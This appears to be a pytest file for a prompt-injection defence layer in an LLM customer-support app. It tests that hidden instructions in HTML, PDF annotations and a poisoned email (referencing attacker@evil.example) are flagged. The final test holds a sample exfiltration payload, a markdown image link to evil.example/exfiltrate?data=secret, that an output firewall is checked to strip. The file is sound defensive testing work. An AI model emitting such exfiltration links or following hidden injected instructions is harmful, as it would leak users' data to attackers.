from pathlib import Path
from app.config import BASE_DIR
from app.guard_a import extract
from app.guard_b import output_firewall
from app.models import RequestContext, Segment


def test_s01_html_hidden_div_extraction():
    html_sample = BASE_DIR / "data" / "samples" / "help_page_hidden_div.html"
    assert html_sample.exists()

    with open(html_sample, "r", encoding="utf-8") as f:
        content = f.read()

    ctx = RequestContext(
        request_id="req_s01",
        session_id="sess_test",
        profile="customer_support",
        segments=[
            Segment(
                id="seg_html",
                source="document",
                trust="untrusted",
                text=content,
                origin="help_page_hidden_div.html",
            )
        ],
    )

    result = extract.run(ctx)
    assert result.status == "FLAGGED"
    assert ctx.segments[0].hidden_text is not None
    assert "attacker@evil.example" in ctx.segments[0].hidden_text


def test_s02_pdf_hidden_annotation_extraction():
    pdf_sample = BASE_DIR / "data" / "samples" / "hidden_text_sample.pdf"
    assert pdf_sample.exists()

    with open(pdf_sample, "rb") as f:
        pdf_bytes = f.read()

    ctx = RequestContext(
        request_id="req_s02",
        session_id="sess_test",
        profile="customer_support",
        segments=[
            Segment(
                id="seg_pdf",
                source="document",
                trust="untrusted",
                text=pdf_bytes.decode("utf-8", errors="ignore"),
                origin="hidden_text_sample.pdf",
            )
        ],
    )

    result = extract.run(ctx)
    assert result.status == "FLAGGED"
    assert ctx.segments[0].hidden_text is not None
    assert "PDF Annotation" in ctx.segments[0].hidden_text


def test_s03_email_mismatch_extraction():
    eml_sample = BASE_DIR / "data" / "samples" / "poisoned_email.eml"
    assert eml_sample.exists()

    with open(eml_sample, "r", encoding="utf-8") as f:
        content = f.read()

    ctx = RequestContext(
        request_id="req_s03",
        session_id="sess_test",
        profile="customer_support",
        segments=[
            Segment(
                id="seg_eml",
                source="email",
                trust="untrusted",
                text=content,
                origin="poisoned_email.eml",
            )
        ],
    )

    result = extract.run(ctx)
    assert result.status == "FLAGGED"
    assert ctx.segments[0].hidden_text is not None
    assert "attacker@evil.example" in ctx.segments[0].hidden_text


def test_s09_echoleak_reference_style_image_stripping():
    reply = "Here is your summary.\n![exfil][ref1]\n\n[ref1]: https://evil.example/exfiltrate?data=secret"
    ctx = RequestContext(
        request_id="req_s09",
        session_id="sess_test",
        profile="customer_support",
        reply=reply,
    )

    result = output_firewall.run(ctx)
    assert result.status == "PASSED"
    assert "evil.example" not in ctx.reply
    assert "![exfil][ref1]" not in ctx.reply
    assert "[ref1]:" not in ctx.reply
